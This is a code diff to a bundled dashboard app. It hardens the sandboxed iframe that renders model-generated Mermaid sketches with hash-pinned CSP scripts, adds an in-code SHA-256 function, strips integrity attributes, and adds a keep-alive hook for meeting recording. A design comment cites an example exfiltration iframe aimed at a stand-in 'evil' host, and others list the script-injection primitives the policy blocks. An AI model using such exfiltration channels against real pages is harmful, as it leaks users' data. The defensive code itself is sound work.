@@ -1,3 +1,4 @@
+import * as sdk from "@kirocrew/app-sdk";
 import { activeLocale, fmtTime, useAppApi, useImeGuard, useLanguageGeneration, useNavigate, useNotify } from "@kirocrew/app-sdk";
 import * as React from "react";
 import H, { Children, Component, Fragment, cloneElement, createContext, createElement, forwardRef, isValidElement, useCallback, useContext, useEffect, useId, useInsertionEffect, useLayoutEffect, useMemo, useRef, useState } from "react";
@@ -10491,6 +10492,144 @@ function escapeScriptClose(js) {
 	}
 	return out + js.slice(from);
 }
+// src/host/sha256Hex.ts
+/**
+* SHA-256 of a string's UTF-8 bytes, as 64 lowercase hex characters, computed
+* SYNCHRONOUSLY.
+*
+* The platform's `crypto.subtle.digest` is the obvious tool and is not used on
+* purpose: it is async, and the one caller (`storedName` in `ensureChatFolder.ts`)
+* derives a folder name inside synchronous code paths that run during render. A
+* folder name is derived rarely and from at most a few hundred bytes, so the cost
+* of a pure-TypeScript compression loop is irrelevant, and a collision-resistant
+* digest is what lets two long names that share a prefix be told apart without
+* trusting a 32-bit tag.
+*
+* FIPS 180-4, straight from the specification; the test file checks the published
+* vectors for the empty string and `abc`.
+*/
+var K = new Uint32Array([
+	1116352408,
+	1899447441,
+	3049323471,
+	3921009573,
+	961987163,
+	1508970993,
+	2453635748,
+	2870763221,
+	3624381080,
+	310598401,
+	607225278,
+	1426881987,
+	1925078388,
+	2162078206,
+	2614888103,
+	3248222580,
+	3835390401,
+	4022224774,
+	264347078,
+	604807628,
+	770255983,
+	1249150122,
+	1555081692,
+	1996064986,
+	2554220882,
+	2821834349,
+	2952996808,
+	3210313671,
+	3336571891,
+	3584528711,
+	113926993,
+	338241895,
+	666307205,
+	773529912,
+	1294757372,
+	1396182291,
+	1695183700,
+	1986661051,
+	2177026350,
+	2456956037,
+	2730485921,
+	2820302411,
+	3259730800,
+	3345764771,
+	3516065817,
+	3600352804,
+	4094571909,
+	275423344,
+	430227734,
+	506948616,
+	659060556,
+	883997877,
+	958139571,
+	1322822218,
+	1537002063,
+	1747873779,
+	1955562222,
+	2024104815,
+	2227730452,
+	2361852424,
+	2428436474,
+	2756734187,
+	3204031479,
+	3329325298
+]);
+var rotr = (x, n) => x >>> n | x << 32 - n;
+function sha256Hex(text) {
+	const bytes = new TextEncoder().encode(text);
+	const bitLen = bytes.length * 8;
+	const padded = new Uint8Array(bytes.length + 9 + 63 >> 6 << 6);
+	padded.set(bytes);
+	padded[bytes.length] = 128;
+	const view = new DataView(padded.buffer);
+	view.setUint32(padded.length - 4, bitLen >>> 0);
+	view.setUint32(padded.length - 8, Math.floor(bitLen / 4294967296));
+	const h = new Uint32Array([
+		1779033703,
+		3144134277,
+		1013904242,
+		2773480762,
+		1359893119,
+		2600822924,
+		528734635,
+		1541459225
+	]);
+	const w = /* @__PURE__ */ new Uint32Array(64);
+	for (let off = 0; off < padded.length; off += 64) {
+		for (let i = 0; i < 16; i++) w[i] = view.getUint32(off + i * 4);
+		for (let i = 16; i < 64; i++) {
+			const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ w[i - 15] >>> 3;
+			const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ w[i - 2] >>> 10;
+			w[i] = w[i - 16] + s0 + w[i - 7] + s1 >>> 0;
+		}
+		let [a, b, c, d, e, f, g, hh] = h;
+		for (let i = 0; i < 64; i++) {
+			const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
+			const ch = e & f ^ ~e & g;
+			const t1 = hh + S1 + ch + K[i] + w[i] >>> 0;
+			const t2 = (rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)) + (a & b ^ a & c ^ b & c) >>> 0;
+			hh = g;
+			g = f;
+			f = e;
+			e = d + t1 >>> 0;
+			d = c;
+			c = b;
+			b = a;
+			a = t1 + t2 >>> 0;
+		}
+		h[0] = h[0] + a >>> 0;
+		h[1] = h[1] + b >>> 0;
+		h[2] = h[2] + c >>> 0;
+		h[3] = h[3] + d >>> 0;
+		h[4] = h[4] + e >>> 0;
+		h[5] = h[5] + f >>> 0;
+		h[6] = h[6] + g >>> 0;
+		h[7] = h[7] + hh >>> 0;
+	}
+	let out = "";
+	for (let i = 0; i < 8; i++) out += h[i].toString(16).padStart(8, "0");
+	return out;
+}
 // src/lib/sketchSrcdoc.ts
 /** The runtime's served path under this build's base (the bare path in the stock build). */
 var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
@@ -10498,7 +10637,8 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 * CSP for the sketch frame. `scriptOrigin` is the dashboard's own origin
 * (`window.location.origin`) — a null-origin document cannot use `'self'`, so
 * the origin is spelled out. The exported file (`buildSketchExport`) passes
-* `null`: its runtime is inlined, so `script-src` is `'unsafe-inline'` alone.
+* `null` and the hash of its inlined runtime instead: it has no origin to load
+* the runtime from.
 *
 * Each directive, and why it is exactly this:
 *
@@ -10508,18 +10648,17 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 *   `<iframe src="https://evil/?d=…">` is just as good an exfil channel as an
 *   image, and inheriting `'none'` blocks it without another directive to keep
 *   in sync.
-* - `script-src 'unsafe-inline' <origin><MERMAID_RUNTIME_PATH>` — pinned to the
-*   single vendored FILE, not to a bare origin and not to `https:`. Same
-*   least-privilege shape as `widgetSrcdoc.cspFor` pinning Tailwind: an injected
-*   document cannot pull arbitrary scripts from other dashboard endpoints, and
-*   crucially a script URL is itself an egress channel, so `script-src https:`
-*   would reopen the finding. `'unsafe-inline'` stays because OUR OWN inline
-*   bootstrap (`MERMAID_BOOTSTRAP_BODY`) is what drives Mermaid, and a `srcdoc`
-*   document has no response header to carry a nonce. Note what it no longer
-*   covers: the model's inline scripts are REMOVED from the document before it is
-*   serialized (`scrubModelDocument`), so `'unsafe-inline'` is a grant to our
-*   code, not to the model's. Replacing it with a build-time hash of that one
-*   literal is the follow-up that would retire the grant entirely.
+* - `script-src 'sha256-<bootstrap>' <origin><MERMAID_RUNTIME_PATH>` — the
+*   runtime is pinned to the single vendored FILE, not to a bare origin and not
+*   to `https:`. Same least-privilege shape as `widgetSrcdoc.cspFor` pinning
+*   Tailwind: an injected document cannot pull arbitrary scripts from other
+*   dashboard endpoints, and crucially a script URL is itself an egress channel,
+*   so `script-src https:` would reopen the finding. The exported file replaces
+*   the URL with `'sha256-<runtime>'`. Inline script runs only when its text
+*   hashes to one of OUR scripts, so `'unsafe-inline'` is NOT granted: model
+*   markup that survives `scrubModelDocument` still cannot run (inline
+*   `<script>`, `on*=` handlers — no `'unsafe-hashes'` — and `javascript:` URLs
+*   are all refused). The scrub stays as defense-in-depth.
 *   `'unsafe-eval'` is NOT granted — the vendored bundle contains zero
 *   `eval(` / `new Function` / `new Worker` / `importScripts` (verified against
 *   mermaid 11.13.0's `mermaid.min.js`), so the frame gets no dynamic-exec
@@ -10544,7 +10683,7 @@ var MERMAID_RUNTIME_PATH = withBase(MERMAID_RUNTIME_PATH$1);
 * - `base-uri 'none'` — a `<base href>` would re-point every relative URL in the
 *   document, including the Mermaid script path, at an attacker origin.
 */
-var cspFor = (scriptOrigin) => `default-src 'none'; script-src 'unsafe-inline'${scriptOrigin === null ? "" : ` ${scriptOrigin}${MERMAID_RUNTIME_PATH}`}; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none';`;
+var cspFor = (runtimeSource) => `default-src 'none'; script-src 'sha256-${MERMAID_BOOTSTRAP_HASH}' ${runtimeSource}; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none';`;
 /** Frame chrome only. Kept deliberately small so it cannot fight the agent's
 * own styling: page padding, a readable default face, and a rule that keeps a
 * wide diagram inside the panel instead of forcing a horizontal scrollbar. */
@@ -10621,6 +10760,22 @@ var MERMAID_BOOTSTRAP_BODY = `(function(){
   if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', start);
   else start();
 })();`;
+/**
+* The text a `<script>` holds once the frame re-parses the serialized document.
+* The HTML parser turns CR / CRLF into LF and NUL into U+FFFD before a script's
+* text exists, and a CSP hash is taken over THAT text — so the hash and the
+* `textContent` we set must both come from this form, or our own script is refused.
+*/
+var asParsedScript = (js) => js.replace(/\r\n?/g, "\n").replace(/\0/g, "�");
+/** Base64 SHA-256 of a script's text, as a CSP `'sha256-…'` source wants it. */
+function cspHash(js) {
+	const hex = sha256Hex(js);
+	let bytes = "";
+	for (let i = 0; i < hex.length; i += 2) bytes += String.fromCharCode(parseInt(hex.slice(i, i + 2), 16));
+	return btoa(bytes);
+}
+var MERMAID_BOOTSTRAP_SCRIPT = asParsedScript(MERMAID_BOOTSTRAP_BODY);
+var MERMAID_BOOTSTRAP_HASH = cspHash(MERMAID_BOOTSTRAP_SCRIPT);
 /**
 * Elements removed outright from the model document. Every one of them is
 * either a script host or a navigation/fetch primitive that would fire before
@@ -10781,7 +10936,7 @@ function scrubModelDocument(root) {
 	for (const el of Array.from(root.querySelectorAll(STRIPPED_TAGS.join(",")))) el.remove();
 	for (const el of Array.from(root.querySelectorAll("*"))) for (const attr of Array.from(el.attributes)) {
 		const name = attr.name.toLowerCase();
-		if (name.startsWith("on")) {
+		if (name.startsWith("on") || name === "integrity") {
 			el.removeAttribute(attr.name);
 			continue;
 		}
@@ -10841,15 +10996,18 @@ function buildSketchSrcdoc(html, scriptOrigin, inlineRuntime) {
 	const style = doc.createElement("style");
 	style.textContent = BASE_CSS;
 	head.appendChild(style);
+	let runtimeSource = `${scriptOrigin}${MERMAID_RUNTIME_PATH}`;
 	if (inlineRuntime === void 0) {
 		const mermaidPlaceholder = doc.createElement("meta");
 		mermaidPlaceholder.setAttribute("name", "x-script-placeholder");
 		mermaidPlaceholder.setAttribute("data-src", scriptOrigin + MERMAID_RUNTIME_PATH);
 		head.appendChild(mermaidPlaceholder);
 	} else {
+		const runtimeScript = asParsedScript(escapeScriptClose(inlineRuntime));
 		const runtime = doc.createElement("script");
-		runtime.textContent = escapeScriptClose(inlineRuntime);
+		runtime.textContent = runtimeScript;
 		head.appendChild(runtime);
+		runtimeSource = `'sha256-${cspHash(runtimeScript)}'`;
 	}
 	const range = doc.createRange();
 	range.selectNodeContents(body);
@@ -10857,11 +11015,11 @@ function buildSketchSrcdoc(html, scriptOrigin, inlineRuntime) {
 	scrubModelDocument(fragment);
 	body.appendChild(fragment);
 	const bootstrap = doc.createElement("script");
-	bootstrap.textContent = MERMAID_BOOTSTRAP_BODY;
+	bootstrap.textContent = MERMAID_BOOTSTRAP_SCRIPT;
 	body.appendChild(bootstrap);
 	const csp = doc.createElement("meta");
 	csp.setAttribute("http-equiv", "Content-Security-Policy");
-	csp.setAttribute("content", cspFor(inlineRuntime === void 0 ? scriptOrigin : null));
+	csp.setAttribute("content", cspFor(runtimeSource));
 	head.insertBefore(csp, head.firstChild);
 	const serialized = `<!DOCTYPE html>\n${doc.documentElement.outerHTML}`;
 	if (inlineRuntime !== void 0) return serialized;
@@ -15978,6 +16136,22 @@ function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onC
 		supported: transcriptionSupported
 	};
 }
+// src/host/keepAlive.ts
+/**
+* Keeps the meeting page running, hidden, while it records.
+*
+* The page owns the microphone and the transcription socket, so leaving it for
+* another dashboard page used to stop the recording until the person came back.
+* The SDK's `useKeepAlive` (App Kit level 16) asks the dashboard to keep the page
+* mounted while `busy` is true and names it on every page with Open and Stop.
+* Feature-detected: an older host has no such export, and the page then closes on
+* leave as before.
+*/
+var hostUseKeepAlive = "useKeepAlive" in sdk ? sdk.useKeepAlive : void 0;
+/** Asks the dashboard to keep this page running while *recording* is true. */
+function useKeepPageWhileRecording(recording) {
+	hostUseKeepAlive?.(recording);
+}
 // src/hooks/useNoteDraft.ts
 var nextImagePlaceholder = 0;
 function insertPlaceholder(text, caret, token) {
@@ -16459,6 +16633,7 @@ function useMeetingSession({ eventId, fallbackTitle, config, notify }) {
 	});
 	const meta = metaQuery.data?.meta;
 	const status = meta?.status ?? "idle";
+	useKeepPageWhileRecording(status === "active");
 	/** Read by the transcription error callback, which must not re-bind per status. */
 	const statusRef = useRef(status);
 	statusRef.current = status;
